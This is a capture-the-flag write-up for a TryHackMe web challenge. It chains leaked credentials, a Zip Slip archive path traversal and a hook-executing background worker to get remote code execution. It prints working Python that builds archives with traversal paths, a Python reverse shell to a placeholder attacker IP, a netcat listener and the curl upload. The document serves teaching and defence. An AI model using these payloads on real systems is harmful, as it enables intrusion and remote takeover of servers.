# The Hollow Shell — TryHackMe Writeup

**Event:** Hacker Holidays 2026 — The Byte Lotus Hotel
**Category:** Web
**Difficulty:** Medium
**Points:** 90
**Flag:** `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`

## Summary

A staff-facing file upload portal ("Shoreline Display") accepts `.zip` archives ("shells") containing a `shell.json` manifest and optional theming assets. The extraction logic does not sanitize zip member paths, allowing a classic **Zip Slip** (path traversal during archive extraction) to write arbitrary files outside the intended `shells/<id>/` directory. A background "theme worker" process polls an application-root `hooks/` directory and executes any Python file it finds there. Chaining the two — writing a malicious script into `hooks/` via Zip Slip — yields code execution and a reverse shell as the `roomservice` user.

## Recon

Initial full-port scan:

```bash
nmap -sV -sC -p- -v 10.113.179.206
```

Two open ports:

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 9.6p1 (Ubuntu) | Not the initial entry point |
| 5000/tcp | HTTP (Gunicorn) | Flask app, redirects `/` → `/login` |

The HTTP title identified the app as **"Byte Lotus — Room Service."**

## Credential Discovery

Viewing the login page source revealed hardcoded staff credentials left in an HTML comment, framed as a forgotten "IT onboarding" default:

```
user: concierge
pass: StayNoticed2024!
```

Logging in landed on `/dashboard`, a "Room Service / Shoreline Display" staff portal.

## Understanding the Upload Feature

The dashboard's **"Bring a shell ashore"** panel accepts a `.zip` ("shell") via `POST /upload`. Each shell must contain a `shell.json` manifest describing a `name` and an `assets` list (allowed types: `png jpg gif svg css json`). Critically, the UI copy noted:

> Optional **automation hooks** — the theme worker applies these for you shortly after the shell comes ashore.

This was the strongest clue in the challenge: a **separate background process** watches uploaded content and acts on it independently of the HTTP request/response cycle.

A baseline upload (`{"name": "test", "assets": []}`) succeeded and was listed on the dashboard as:

```
shells/6be6dede5b89/
```

confirming the storage pattern `shells/<random-hex-id>/`, with individual files retrievable via:

```
GET /shells/<id>/<filename>
```

Uploading without a `shell.json` produced a flash message (`"Shell is missing shell.json."`), confirming manifest validation exists but showed no stack trace — Flask debug mode is off, ruling out that path to source disclosure.

## Discovering the Zip Slip

The standard `zip` CLI refuses to add entries containing `../` to an archive, so early tests built with `zip` (declaring traversal strings only inside the `shell.json` `assets` array, or via mismatched entry names) failed to move any file outside its own shell folder — the mismatch between declared asset names and actual zip member names meant nothing was actually being written where expected.

The fix was to bypass the `zip` CLI entirely and build archives directly with Python's `zipfile.ZipFile.writestr()`, which imposes no restriction on member names:

```python
import zipfile
zf = zipfile.ZipFile('slip.zip', 'w')
zf.writestr('shell.json', '{"name": "slip-test", "assets": []}')
zf.writestr('../marker.txt', '')
zf.close()
```

Uploading this caused `marker.txt` to appear one directory above its own shell folder — i.e., directly inside `shells/`, confirming the extraction logic writes zip member paths literally to disk with no traversal sanitization.

Since the file-serving route (`GET /shells/<id>/<filename>`) *does* block `../` in the URL itself, reading the dropped file back through that route wasn't possible. To get unambiguous proof, the traversal was aimed two directory levels up, into Flask's default `static/` folder (served openly):

```python
zf.writestr('../../static/zipslip-proof.css', 'ZIP_SLIP_CONFIRMED')
```

Fetching `http://<target>:5000/static/zipslip-proof.css` returned the injected content verbatim, confirming a working arbitrary file write two levels above the extraction directory (i.e., at the application root: `shells/<id>/` -> `shells/` -> app root).

## Locating the Execution Primitive

Revisiting the "automation hooks" / "theme worker" hint, the natural target was a `hooks/` directory living alongside `static/` and `shells/` at the app root — polled by a background worker that executes anything dropped into it.

A probe upload targeting `../../hooks/callback.py` returned a clean success (no 500 error), consistent with the folder already existing at that depth — versus a write to a genuinely non-existent path, which produced an error.

## Exploitation — Reverse Shell

**1. Listener on attacker box:**

```bash
nc -lvnp 4444
```

**2. Payload — standard Python reverse shell:**

```python
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("<ATTACKER_IP>", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
```

**3. Build the malicious archive with `zipfile`, writing the manifest normally but the payload with a traversal path:**

```python
import zipfile
zf = zipfile.ZipFile('reverse-shell.zip', 'w')
zf.writestr('shell.json', '{"name": "zipslip-rs", "assets": []}')
zf.writestr('../../hooks/callback.py', open('callback.py').read())
zf.close()
```

**4. Upload via the authenticated session:**

```bash
curl -s -b "session=<SESSION_COOKIE>" \
  -F "shell=@reverse-shell.zip" \
  http://<target>:5000/upload -i
```

Within moments, the theme worker's polling loop picked up `hooks/callback.py` and executed it, connecting back to the listener as `roomservice`.

## Post-Exploitation

The application source directory (`/var/www/conch`) confirmed the architecture inferred during testing:

```
app.py            # Flask application (routes, upload handling)
theme_worker.py   # Background worker polling hooks/
hooks/            # Executed automatically by the worker
shells/           # Extracted shell uploads
static/           # Flask default static assets
templates/
```

The flag was located in the user's home directory:

```bash
roomservice@tryhackme-2404:~$ cat flag.txt
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

## Root Cause & Takeaways

- **Zip Slip** stems from extraction code that trusts zip member names as literal filesystem paths without normalizing or rejecting `../` sequences. Python's `zipfile` module (and most languages' zip libraries) will happily write wherever the archive tells it to unless the application explicitly guards against it — e.g., resolving each target path and verifying it stays within the intended extraction root.
- Combining an arbitrary-file-write primitive with a **polling background worker that trusts a fixed directory** is a reliable path from "write anywhere" to full code execution — the worker becomes the payload's trigger, with no need for a second, separate vulnerability.
- Tooling matters during testing: the standard `zip` CLI's refusal to add `../` entries can give a false negative. Building archives with raw library calls (Python `zipfile.writestr`, or equivalent) is necessary to properly test for Zip Slip.
- Leaked "onboarding" credentials in HTML comments remain a surprisingly common and effective initial foothold, independent of the more interesting vulnerability further in.
